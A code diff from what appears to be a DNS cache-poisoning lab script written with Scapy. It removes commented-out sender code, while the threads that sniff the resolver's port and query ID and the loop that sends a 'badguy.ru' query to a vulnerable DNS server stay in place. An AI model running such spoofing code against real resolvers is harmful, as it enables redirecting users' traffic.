@@ -26,24 +26,8 @@ class FirstThread(Thread):
                 if self.job == 0:                                                                                       # sniffing port and ID
                         sniffer_job()
 
-                '''
-                if self.job == 1:                                                       # sender per badguy
-                        sender_job()
-                '''
-
                 if self.job == 1:                                                                                       # listening the secret
                         secret_job()
-
-
-"""
-def sender_job():
-        '''
-        invio la prima query DNS per badguy.ru
-        :return:
-        '''
-        time.sleep(1)                                                                 # attendo che parta lo sniffer
-        send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))
-"""
 
 def sniffer_job():
         '''
@@ -90,12 +74,6 @@ def master_job():
         while GOAL == 0:
                 sniffer_thread = FirstThread(name="sniffer", job=0)                                                     # init sniffer
                 sniffer_thread.start()
-
-                '''sender_thread = FirstThread(name="sender", job=1)
-                sender_thread.start()
-                sender_thread.join()'''
-
-                #sender_job()
 
                 time.sleep(1)                                                                                           # waiting for the sniffer
                 send(IP(dst=VULN_DNS_IP) / UDP() / DNS(rd=1, qd=DNSQR(qname="badguy.ru")))                              # badguy query
